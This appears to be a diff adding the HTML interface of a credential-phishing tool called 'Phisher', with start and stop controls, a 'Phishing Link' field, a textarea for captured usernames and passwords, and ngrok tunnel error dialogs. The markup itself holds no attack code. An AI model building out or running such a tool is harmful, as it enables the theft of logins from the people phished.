@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+ <html> 
+    <head>
+        <meta charset="utf-8">
+        <title>Phisher</title>
+         <script src="./icons/js/icons.js"></script>
+        <link rel="stylesheet" href="./css/bulma.css">
+        <link rel="stylesheet" href="./css/styles.css">
+        <!-- <link rel="stylesheet" href="./css/bulma-tooltip.css"> -->
+       
+    </head>
+    <body>
+       <!-- HEAD ICONS AND NAME -->
+       <div class="">
+            <figure>
+                <img class="image-center" src="./img/img_1.png">
+            </figure>
+       </div>
+
+       <!-- BUTTONS FOR START AND STOP -->
+
+       <div class="buttons is-centered buttons-div">
+       <button class="button is-success is-rounded is-medium start-button" id="start-button-a">
+        <span>Start</span>
+        <span class="icon is-small">
+            <i class="fas fa-play"></i>
+        </span>
+       </button>
+
+
+       <button class="button is-danger is-rounded is-medium is-outlined stop-button is-disabled" id="stop-button-a" disabled>
+        <span>Stop</span>
+        <span class="icon is-small">
+            <i class="fas fa-stop-circle"></i>
+        </span>
+       </button>
+    </div>
+
+    <!-- BOTTOM AREA -->
+    <div class="bottom-div">
+        <div class="copy-link-div">
+        <h5 class="title is-5 titles-head"><small>Phishing Link</small></h5>
+
+        <div class="field">
+            <div class="control">
+                <p class="control has-icons-right is-medium">
+                <input class="input is-danger" id="ml-input" value="" type="text" placeholder="malicious link will be here">
+            <span class="icon is-small is-right">
+                    <i class="fas fa-copy" aria-hidden="true"></i>
+            </span>
+                </p>
+            </div>
+        </div>
+    </div>
+
+
+<!-- OUTPUT USERNAME AND PASSWORD TEXT AREA -->
+    <div class="field">
+            <h5 class="title is-5 titles-head"><small>Attemps</small></h5>
+            <div class="control">
+                <p class="control has-icons-right is-medium">
+                <textarea class="input is-danger attemps-text-area is-danger output-text-area attemps-area" id="ml-input" type="text" placeholder="malicious link will be here"></textarea>
+            <!-- <span class="icon is-small is-right delete-icon-action">
+                    <a class="button is-small is-danger" onclick="console.log('clear')">clear</a>
+            </span> -->
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- OFFLINE MODAL WINDOW -->
+    <div class="modal modal-offline">
+        <div class="modal-background"></div>
+        <div class="modal-content">
+        <div class="container modal-div">
+               <span class="icon icon-center"><i class="fas fa-ban fa-5x offline-title"></i></span>
+          <h5 class="is-centered title is-5 center-text offline-title">you are offline</h5>
+          <h6 class="subtitle is-6 offline-title">Please check your connection and restart</h6>
+        </div>
+        </div>
+      </div>
+
+      <!-- INTERNAL SERVER ERROR -->
+      <div class="modal internal-server-err">
+        <div class="modal-background"></div>
+        <div class="modal-content">
+        <div class="container modal-div">
+               <span class="icon icon-center"><i class="fas fa-server offline-title"></i></span>
+          <h5 class="is-centered title is-5 center-text offline-title">Internal Server Error</h5>
+          <h6 class="subtitle is-6 offline-title">Please check your connection and restart</h6>
+        </div>
+        </div>
+      </div>
+
+<!-- NGROK ERROR -->
+      <div class="modal ngrok-err">
+        <div class="modal-background"></div>
+        <div class="modal-content">
+        <div class="container modal-div">
+               <span class="icon icon-center"><i class="fas fa-broadcast-tower offline-title"></i></span>
+          <h5 class="is-centered title is-5 center-text offline-title">Is your internet is Slow ?</h5> 
+          <h6 class="subtitle is-6 offline-title">Please check your connection and restart</h6>
+        </div>
+        </div>
+      </div>
+
+       <!-- NGROK NOT FOUND
+       <div class="modal ngrok-exec-err">
+            <div class="modal-background"></div>
+            <div class="modal-content">
+            <div class="container modal-div">
+                   <span class="icon icon-center"><i class="fas fa-meh-blank offline-title"></i></span>
+              <h5 class="is-centered title is-5 center-text offline-title">ngrok executable not found</h5>
+              <h6 class="subtitle is-6 offline-title">Please install ngrok and export to $PATH</h6>
+              <h6 class="subtitle is-6 offline-title">Visit https://ngrok.com</h6>
+              
+            </div>
+            </div>
+          </div> -->
+
+
+       <script src="..//app/app.js"></script>
+    </body>
+</html>
